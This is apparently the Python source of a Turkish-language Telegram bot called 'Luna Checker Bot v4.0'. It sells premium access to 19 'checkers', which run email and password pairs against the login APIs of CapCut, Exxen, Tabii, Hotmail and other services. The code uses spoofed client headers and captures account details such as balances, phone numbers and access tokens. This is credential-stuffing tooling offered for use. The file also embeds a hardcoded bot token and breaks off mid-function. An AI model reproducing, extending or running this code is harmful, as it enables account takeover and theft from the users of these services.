#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██╗     ██╗   ██╗███╗   ██╗ █████╗     ██████╗ ██╗  ██╗███████╗ ██████╗██╗  ║
║   ██║     ██║   ██║████╗  ██║██╔══██╗    ██╔══██╗██║  ██║██╔════╝██╔════╝██║  ║
║   ██║     ██║   ██║██╔██╗ ██║███████║    ██████╔╝███████║█████╗  ██║     ██║  ║
║   ██║     ██║   ██║██║╚██╗██║██╔══██║    ██╔══██╗██╔══██║██╔══╝  ██║     ██║  ║
║   ███████╗╚██████╔╝██║ ╚████║██║  ██║    ██████╔╝██║  ██║███████╗╚██████╗██████╗║
║   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═════╝║
║                                                                               ║
║           🌙 L U N A   C H E C K E R   B O T   v 4 . 0   🌙                  ║
║                                                                               ║
║           📌 @lunasloury / @                                     ║
║           📅 19 CHECKER - TÜM APILER GÖMÜLÜ                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os, sys, json, time, random, string, threading, sqlite3, re, uuid, hashlib, base64
import urllib.parse
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import quote, unquote

import requests
from bs4 import BeautifulSoup
import cloudscraper
import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply

# ═══════════════════════════════════════════════════════════════════════
# KONFİGÜRASYON
# ═══════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8265183707:AAEIQpuwqTC7-qfQxA2IRinFHvjFFOIylh8"
ADMIN_IDS = [7250471858]

owner_name_luna = "https://t.me/lunasloury "

# KANAL ZORUNLULUĞU
CHANNEL_1 = "luna_bot_destek"  # ← 1. kanal username
CHANNEL_2 = "glearya"  # ← 2. kanal username

PREMIUM_PRICES = {7: 100, 30: 350, 90: 450, 365: 1500}
DAILY_LIMIT_FREE = 2
DAILY_LIMIT_PREMIUM = 7
DAILY_LIMIT_ADMIN_IDS = 999


CHECKER_THREADS = {
    "1": 80, "2": 5, "3": 10, "4": 5, "5": 5,
    "6": 5, "7": 3, "8": 5, "9": 5, "10": 3,
    "11": 3, "12": 3, "13": 3, "14": 50, "15": 30,
    "16": 5, "17": 3, "18": 5, "19": 10
}

# ═══════════════════════════════════════════════════════════════════════
# CHECKER TANIMLARI - TÜM APILER, HEADERLAR, LİNK VE LİMİTLER GÖMÜLÜ
# ═══════════════════════════════════════════════════════════════════════

CHECKERS = {
    "1": {
        "name": "CapCut",
        "emoji": "🎬",
        "url": "https://raw.githubusercontent.com/Octopus-no1/capcutcheckerocto/refs/heads/main/CAPCUT%20CHECKER%20%5B%40OctpsPrime%5D%20(2).py",
        "active": True,
        "login_url": "https://www.capcut.com/api/login",
        "headers": {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Linux"',
            "Content-Type": "application/json"
        },
        "description": "CapCut video düzenleme platformu - premium abonelik kontrolü",
        "fields": ["Abonelik", "Tutar", "Ödeme Yöntemi", "Bitiş Tarihi"]
    },
    "2": {
        "name": "OyuncuStore",
        "emoji": "🛒",
        "url": "https://raw.githubusercontent.com/Octopus-no1/oyuncustorechecker/refs/heads/main/oyuncustore.py",
        "active": True,
        "login_url": "https://oyuncustore.net/hesabim/?action=login",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "description": "OyuncuStore oyun mağazası - sipariş ve indirme kontrolü",
        "fields": ["Ad Soyad", "Sipariş Sayısı"]
    },
    "3": {
        "name": "Exxen",
        "emoji": "📺",
        "url": "https://raw.githubusercontent.com/Octopus-no1/exxenchecker/refs/heads/main/%40OctpsPrime%20%5BEXXEN%20CHECKERR%20%F0%9F%94%B1%5D.py",
        "active": True,
        "login_url": "https://mw-proxy.app.exxen.com/user/login",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Connection": "keep-alive"
        },
        "description": "Exxen dizi/film platformu - paket bilgisi kontrolü",
        "fields": ["Paket Tipi", "Hesap Türü"]
    },
    "4": {
        "name": "Tabii",
        "emoji": "📡",
        "url": "https://raw.githubusercontent.com/Octopus-no1/tabiichecker/refs/heads/main/TAB%C4%B0%C4%B0%20CHECKER%20(2).py",
        "active": True,
        "login_url": "https://eu1.tabii.com/apigateway/auth/v2/login",
        "headers": {
            "Accept-Encoding": "gzip",
            "Accept-Language": "tr",
            "App-Bundle-Id": "com.trt.tabii.android",
            "App-Name": "Tabii",
            "App-Version": "90",
            "Authorization": "Bearer null",
            "Connection": "Keep-Alive",
            "Content-Type": "application/json; charset=UTF-8",
            "Platform": "AndroidPhone",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; SM-S901B)"
        },
        "description": "TRT Tabii platformu - premium üyelik kontrolü",
        "fields": ["Ad Soyad", "Premium Durumu"]
    },
    "5": {
        "name": "Epinfy",
        "emoji": "🔍",
        "url": "https://raw.githubusercontent.com/Octopus-no1/epinfychecker/refs/heads/main/%40OctpsPrime%20%5BEP%C4%B0NFY%20FULL%20CAPTURE%20CHECKER%5D.py",
        "active": True,
        "login_url": "https://epinfy.com/client/kontrol-paneli",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "origin": "https://epinfy.com",
            "referer": "https://epinfy.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "description": "Epinfy panel - bakiye, sipariş ve profil bilgisi",
        "fields": ["Ad Soyad", "Telefon", "Bakiye", "Sipariş Sayısı", "Toplam Harcama"]
    },
    "6": {
        "name": "S2GEPİN",
        "emoji": "🎮",
        "url": "https://raw.githubusercontent.com/Octopus-no1/s2gepinchecker/refs/heads/main/%40OctpsPrime%20%5BS2GEP%C4%B0N%20CHECKER%5D%20(2).py",
        "active": True,
        "login_url": "https://api.s2gepin.com/Login/Customer",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        },
        "description": "S2GEPIN oyun platformu - bakiye, puan, hesap tipi",
        "fields": ["İsim", "Bakiye", "Çekilebilir", "Puan", "Hesap Tipi", "Telefon"]
    },
    "7": {
        "name": "İdefix",
        "emoji": "📚",
        "url": "https://raw.githubusercontent.com/Octopus-no1/idefixchecker/refs/heads/main/idefix%20(2).py",
        "active": True,
        "login_url": "https://fapi.idefix.com/ecom/customer/login",
        "headers": {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "x-platform": "android"
        },
        "description": "İdefix kitap mağazası - ad soyad, sipariş, sepet bilgisi",
        "fields": ["Ad Soyad", "Sipariş Sayısı", "Sepet Ürün", "Sepet Tutarı"]
    },
    "8": {
        "name": "SSport+",
        "emoji": "⚽",
        "url": "https://raw.githubusercontent.com/Octopus-no1/ssportpluschecker/refs/heads/main/ssport%20(2).py",
        "active": True,
        "login_url": "https://api.ssportplus.com/mw/SubscriberLogin",
        "headers": {
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/json; charset=UTF-8",
            "Host": "api.ssportplus.com",
            "UILanguage": "tr",
            "User-Agent": "Android_Mobile/2.31.26"
        },
        "description": "SSport+ spor platformu - paket, abonelik, yenileme",
        "fields": ["Ad Soyad", "Telefon", "Paket", "Yenileme"]
    },
    "9": {
        "name": "SMSOnay",
        "emoji": "📱",
        "url": "https://raw.githubusercontent.com/Octopus-no1/smsonaychecker/refs/heads/main/%40OctpsPrime%20%5BSMSONAY.COM%5D%20(2).py",
        "active": True,
        "login_url": "https://www.smsonay.com/ajax/login",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.smsonay.com",
            "Referer": "https://www.smsonay.com/login"
        },
        "description": "SMSOnay sms onay platformu - bakiye, kullanılan numara",
        "fields": ["Ad Soyad", "Bakiye", "Kullanılan Numara"]
    },
    "10": {
        "name": "BEIN x TOD",
        "emoji": "🎯",
        "url": "https://raw.githubusercontent.com/Octopus-no1/beinxtodchecker/refs/heads/main/BE%C4%B0N%20x%20TOD%20CHECKER%20%5B%40OctpsPrime%5D%20(2).py",
        "active": True,
        "login_url": "https://onlineislemler.digiturk.com.tr/Account/Login",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "description": "BEIN Connect / TOD TV - paket sayısı ve kanal bilgisi",
        "fields": ["Paket Sayısı", "Paket Adı", "Platform"]
    },
    "11": {
        "name": "Medya Bayim",
        "emoji": "🏪",
        "url": "https://raw.githubusercontent.com/Octopus-no1/medyabayimchecker/refs/heads/main/%40OctpsPrime%20%5BMEDYA%20BAY%C4%B0M%20CHECKRS%5D%20(2).py",
        "active": True,
        "login_url": "https://medyabayim.com/",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "description": "Medya Bayim panel - bakiye ve üyelik kontrolü",
        "fields": ["Bakiye"]
    },
    "12": {
        "name": "EZGlobal",
        "emoji": "🌍",
        "url": "https://raw.githubusercontent.com/Octopus-no1/ezglobalchecker/refs/heads/main/EZGLOBAL%20CHECKER%20FULL%20CAP%20%5B%40OctpsPrime%5D%20(2).py",
        "active": True,
        "login_url": "https://www.ezglobalyazilim.com/ajax.php",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.ezglobalyazilim.com",
            "Referer": "https://www.ezglobalyazilim.com/uyelik.html"
        },
        "description": "EZGlobal yazılım paneli - ad soyad, telefon, bakiye",
        "fields": ["Ad Soyad", "Telefon", "Bakiye"]
    },
    "13": {
        "name": "OyunDinar",
        "emoji": "💎",
        "url": "https://raw.githubusercontent.com/Octopus-no1/oyundinarchecker/refs/heads/main/%40OctpsPrime%20%7BOYUND%C4%B0NAR%20CHECKRSS%5D%20(2).py",
        "active": True,
        "login_url": "https://www.oyundinar.com/",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        },
        "description": "OyunDinar oyun platformu - bakiye, sipariş, oyun bilgisi",
        "fields": ["Bakiye", "Sipariş Sayısı", "Satın Alınan Oyunlar"]
    },
    "14": {
        "name": "Hotmail Inboxer",
        "emoji": "📧",
        "url": "https://raw.githubusercontent.com/Octopus-no1/hotmailinboxer/refs/heads/main/OCTOPUS%20V2%20%5BHOTMA%C4%B0L%20%C4%B0NBOXER%5D%20(2).py",
        "active": True,
        "login_url": "https://login.live.com/oauth20_authorize.srf",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "description": "Hotmail/Outlook mail hesabı - giriş doğrulama + access token",
        "fields": ["Access Token", "CID"]
    },
    "15": {
        "name": "BKM Kitap",
        "emoji": "📖",
        "url": "https://raw.githubusercontent.com/Octopus-no1/bkmkitapchecker/refs/heads/main/%40OctpsPrime%20%5BBKM%20K%C4%B0TAP%5D%20(2).py",
        "active": True,
        "login_url": "https://www.bkmkitap.com/srv/customer/signin/email/",
        "headers": {
            "Host": "www.bkmkitap.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.206",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bkmkitap.com",
            "Referer": "https://www.bkmkitap.com/uye-girisi-sayfasi",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "description": "BKM Kitap mağazası - ad soyad, kayıt tarihi",
        "fields": ["Ad", "Soyad", "Kayıt Tarihi"]
    },
    "16": {
        "name": "Snapchat VM",
        "emoji": "👻",
        "url": "https://raw.githubusercontent.com/Octopus-no1/snapchatvmchecker/refs/heads/main/SNAPCHAT%20VM%20CHECKER%20%5B%40OctpsPrime%5D%20(2).py",
        "active": True,
        "login_url": "https://bitmoji.api.snapchat.com/api/user/find",
        "headers": {
            "origin": "https://www.bitmoji.com",
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://www.bitmoji.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4664.110 Safari/537.36"
        },
        "description": "Snapchat Bitmoji VM - kullanıcı varlık kontrolü",
        "fields": ["User ID", "Avatar Durumu"]
    },
    "17": {
        "name": "Barlas Medya",
        "emoji": "📰",
        "url": "https://raw.githubusercontent.com/Octopus-no1/barlasmedyachecker/refs/heads/main/Barlas%20Medya%20(2).py",
        "active": True,
        "login_url": "https://barlasmedya.com/",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "description": "Barlas Medya panel - üyelik doğrulama",
        "fields": ["Kullanıcı Adı"]
    },
    "18": {
        "name": "SuperCell",
        "emoji": "🕹️",
        "url": "https://raw.githubusercontent.com/Octopus-no1/supercellchecker/refs/heads/main/SUPERcELL%20V2%20(2).py",
        "active": True,
        "login_url": "https://odc.officeapps.live.com/odc/emailhrd/getidp",
        "headers": {
            "User-Agent": "Dalvik/2.1.0 (Linux; Android 9; SM-G975N)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "description": "SuperCell ID (microsoft üzerinden) - oyun hesap kontrolü",
        "fields": ["SuperCell ID"]
    },
    "19": {
        "name": "Fenix Oyun",
        "emoji": "🐉",
        "url": "https://raw.githubusercontent.com/Octopus-no1/fenixoyunchecker/refs/heads/main/FEN%C4%B0X%20OYUN%20FULL%20CAPTURE%20%5B%40OctpsPrime%5D%20(2).py",
        "active": True,
        "login_url": "https://fenixoyun.com/giris",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        },
        "description": "Fenix Oyun platformu - bakiye, istek listesi, oyun bilgisi",
        "fields": ["Ad Soyad", "Bakiye", "İstek Listesi", "Oyun Sayısı"]
    }
}

# ═══════════════════════════════════════════════════════════════════════
# VERİTABANI
# ═══════════════════════════════════════════════════════════════════════

DB_PATH = "luna_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT,
        is_premium INTEGER DEFAULT 0, premium_until TEXT, is_banned INTEGER DEFAULT 0,
        ban_reason TEXT, joined_date TEXT, total_checks INTEGER DEFAULT 0, last_check_date TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS premium_codes (
        code TEXT PRIMARY KEY, duration_days INTEGER, max_uses INTEGER,
        used_count INTEGER DEFAULT 0, created_by INTEGER, created_date TEXT, is_active INTEGER DEFAULT 1
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS used_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, user_id INTEGER, used_date TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS daily_usage (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, date TEXT, check_count INTEGER DEFAULT 0
    )""")
    conn.commit(); conn.close()

def get_db():
    return sqlite3.connect(DB_PATH, check_same_thread=False)

def get_or_create_user(user_id, username="", first_name="", last_name=""):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user:
        c.execute("INSERT INTO users (user_id, username, first_name, last_name, joined_date) VALUES (?,?,?,?,?)",
                  (user_id, username, first_name, last_name, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
        return {"user_id": user_id, "is_premium": 0, "is_banned": 0}
    conn.close()
    cols = ["user_id","username","first_name","last_name","is_premium","premium_until","is_banned","ban_reason","joined_date","total_checks","last_check_date"]
    return dict(zip(cols, user))

def is_banned(user_id):
    conn = get_db(); c = conn.cursor()
    r = c.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    return r and r[0] == 1

def is_premium(user_id):
    conn = get_db(); c = conn.cursor()
    r = c.execute("SELECT is_premium, premium_until FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if r and r[0] == 1 and r[1]:
        if datetime.strptime(r[1], "%Y-%m-%d %H:%M:%S") > datetime.now():
            return True
        set_premium(user_id, 0)
    return False

def set_premium(user_id, val, days=0):
    conn = get_db(); c = conn.cursor()
    if val:
        until = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium=1, premium_until=? WHERE user_id=?", (until, user_id))
    else:
        c.execute("UPDATE users SET is_premium=0, premium_until=NULL WHERE user_id=?", (user_id,))
    conn.commit(); conn.close()

def ban_user(uid, reason=""):
    conn = get_db(); c = conn.cursor()
    c.execute("UPDATE users SET is_banned=1, ban_reason=? WHERE user_id=?", (reason, uid))
    conn.commit(); conn.close()

def unban_user(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("UPDATE users SET is_banned=0, ban_reason=NULL WHERE user_id=?", (uid,))
    conn.commit(); conn.close()

def get_daily_usage(uid):
    today = datetime.now().strftime("%Y-%m-%d")
    conn = get_db(); c = conn.cursor()
    r = c.execute("SELECT check_count FROM daily_usage WHERE user_id=? AND date=?", (uid, today)).fetchone()
    conn.close()
    return r[0] if r else 0

def increment_daily(uid):
    today = datetime.now().strftime("%Y-%m-%d")
    conn = get_db(); c = conn.cursor()
    r = c.execute("SELECT check_count FROM daily_usage WHERE user_id=? AND date=?", (uid, today)).fetchone()
    if r:
        c.execute("UPDATE daily_usage SET check_count=check_count+1 WHERE user_id=? AND date=?", (uid, today))
    else:
        c.execute("INSERT INTO daily_usage(user_id,date,check_count) VALUES(?,?,1)", (uid, today))
    c.execute("UPDATE users SET total_checks=total_checks+1, last_check_date=? WHERE user_id=?", 
              (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), uid))
    conn.commit(); conn.close()

def get_remaining(uid):
    limit = DAILY_LIMIT_PREMIUM if is_premium(uid) else DAILY_LIMIT_FREE
    return max(0, limit - get_daily_usage(uid))

def generate_code(days, max_uses, created_by):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO premium_codes(code,duration_days,max_uses,created_by,created_date) VALUES(?,?,?,?,?)",
              (code, days, max_uses, created_by, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()
    return code

def use_code(code, uid):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT * FROM premium_codes WHERE code=? AND is_active=1", (code,))
    r = c.fetchone()
    if not r:
        conn.close()
        return False, "Kod bulunamadı veya aktif değil."
    if r[3] >= r[2]:
        conn.close()
        return False, "Kod maksimum kullanıma ulaştı."
    c.execute("UPDATE premium_codes SET used_count=used_count+1 WHERE code=?", (code,))
    c.execute("INSERT INTO used_codes(code,user_id,used_date) VALUES(?,?,?)", (code, uid, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()
    set_premium(uid, True, r[1])
    return True, f"Premium başarıyla aktif! ({r[1]} gün)"

def get_codes():
    conn = get_db(); c = conn.cursor()
    r = c.execute("SELECT * FROM premium_codes ORDER BY created_date DESC").fetchall()
    conn.close()
    return r

def get_users():
    conn = get_db(); c = conn.cursor()
    r = c.execute("SELECT * FROM users ORDER BY joined_date DESC").fetchall()
    conn.close()
    return r

def get_stats():
    conn = get_db(); c = conn.cursor()
    s = {
        "total_users": c.execute("SELECT COUNT(*) FROM users").fetchone()[0],
        "total_premium": c.execute("SELECT COUNT(*) FROM users WHERE is_premium=1").fetchone()[0],
        "total_banned": c.execute("SELECT COUNT(*) FROM users WHERE is_banned=1").fetchone()[0],
        "total_checks": c.execute("SELECT COALESCE(SUM(total_checks),0) FROM users").fetchone()[0],
        "total_codes": c.execute("SELECT COUNT(*) FROM premium_codes").fetchone()[0],
        "today_checks": c.execute("SELECT COALESCE(SUM(check_count),0) FROM daily_usage WHERE date=?", 
                                  (datetime.now().strftime("%Y-%m-%d"),)).fetchone()[0],
        "active_today": c.execute("SELECT COUNT(DISTINCT user_id) FROM daily_usage WHERE date=?",
                                  (datetime.now().strftime("%Y-%m-%d"),)).fetchone()[0]
    }
    conn.close()
    return s
    
    
    
   # ═══════════════════════════════════════════════════════════════════════
# KANAL KONTROL FONKSİYONU
# ═══════════════════════════════════════════════════════════════════════

def check_channels(user_id):
    """Kullanıcının kanallara üyeliğini kontrol et"""
    try:
        for ch in [CHANNEL_1, CHANNEL_2]:
            if ch.startswith("@"):
                member = bot.get_chat_member(ch, user_id)
                if member.status in ["left", "kicked"]:
                    return False, ch
        return True, None
    except Exception as e:
        return False, str(e)

def channel_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(f"📢 Destek kanalı {CHANNEL_1}", url=f"https://t.me/{CHANNEL_1.replace('@', '')}"),
        InlineKeyboardButton(f"📢 Chat {CHANNEL_2}", url=f"https://t.me/{CHANNEL_2.replace('@', '')}"),
        InlineKeyboardButton("✅ Katıldım, Kontrol Et", callback_data="check_channel")
    )
    return markup 
    
    

# ═══════════════════════════════════════════════════════════════════════
# 19 CHECKER MOTORU - TÜM APILER GÖMÜLÜ
# ═══════════════════════════════════════════════════════════════════════

def extract_between(text, left, right):
    try:
        s = text.find(left)
        if s == -1: return None
        s += len(left)
        e = text.find(right, s)
        if e == -1: return None
        return text[s:e].strip()
    except:
        return None

def checker_capcut(email, password):
    """CapCut Checker - API: capcut.com/api/login"""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "Content-Type": "application/json"
    }
    try:
        r = session.post("https://www.capcut.com/api/login", json={"email": email, "password": password}, headers=headers, timeout=15)
        if r.status_code == 200 and "token" in r.text:
            data = r.json()
            return {"hit": True, "fields": {
                "Abonelik": data.get("subscription", "Free"),
                "Kullanıcı": data.get("nickname", email)
            }, "raw": r.text[:200]}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_oyuncustore(email, password):
    """OyuncuStore Checker - API: oyuncustore.net"""
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
    try:
        r = session.get("https://oyuncustore.net/hesabim/?action=login", headers=headers, timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find("input", {"id": "woocommerce-login-nonce"})
        if not token:
            return {"hit": False}
        token = token['value']
        data = {"username": email, "password": password, "woocommerce-login-nonce": token, "_wp_http_referer": "/hesabim/?action=login", "login": "Oturum aç"}
        r2 = session.post("https://oyuncustore.net/hesabim/?action=login", data=data, headers=headers, timeout=15)
        hatalar = ["kullanıcı adı bu sitede kayıtlı değil.", "Kullanıcı adı zorunludur."]
        if any(h in r2.text.lower() for h in hatalar):
            return {"hit": False}
        if "/downloads/" in r2.text or "hesabim/downloads/" in r2.url:
            name = extract_between(r2.text, "Hoşgeldin", "<") or email
            return {"hit": True, "fields": {"Ad": name.strip(), "Durum": "Premium Üye"}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_exxen(email, password):
    """Exxen Checker - API: mw-proxy.app.exxen.com"""
    auth = base64.b64encode(f"{email}:{password}".encode()).decode()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Authorization": f"Basic {auth}",
        "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"
    }
    try:
        payload = {"deviceDetails": {"deviceName": "Chrome", "deviceType": "mobile", "modelNo": "131.0.0.0", "serialNo": "131.0.0.0", "brand": "Chrome", "os": "Android", "osVersion": "10"}}
        r = requests.post("https://mw-proxy.app.exxen.com/user/login", json=payload, headers=headers, timeout=15)
        if r.status_code == 200 and "bearer" in r.text:
            data = r.json()
            token = data.get("bearer", {}).get("auth", {}).get("token", "")
            if token:
                h2 = {"User-Agent": headers["User-Agent"], "Accept": "application/json", "Content-Type": "application/json"}
                r2 = requests.post("https://mw-proxy.app.exxen.com/user/search", json={"email": email}, headers=h2, timeout=10)
                account_type = "Bilinmiyor"
                if r2.status_code == 200:
                    account_type = r2.json().get("accountType", "Bilinmiyor")
                paket = "✅ Paketli" if account_type != "Residential" else "⚠️ Paketsiz"
                return {"hit": True, "fields": {"Paket": paket, "Hesap Tipi": account_type}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_tabii(email, password):
    """Tabii Checker - API: eu1.tabii.com"""
    device_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    headers = {
        "Accept-Encoding": "gzip", "Accept-Language": "tr",
        "App-Bundle-Id": "com.trt.tabii.android", "App-Name": "Tabii", "App-Version": "90",
        "Authorization": "Bearer null", "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=UTF-8",
        "Device-Brand": "Samsung", "Device-Model": "SM-A505F",
        "Device-Id": device_id, "Device-OS-Name": "Android", "Device-OS-Version": "28",
        "Device-Type": "AndroidPhone", "Platform": "AndroidPhone",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; SM-S901B)",
        "x-clientid": "ANDROID", "x-clientpass": "000", "x-uid": device_id
    }
    try:
        r = requests.post("https://eu1.tabii.com/apigateway/auth/v2/login", 
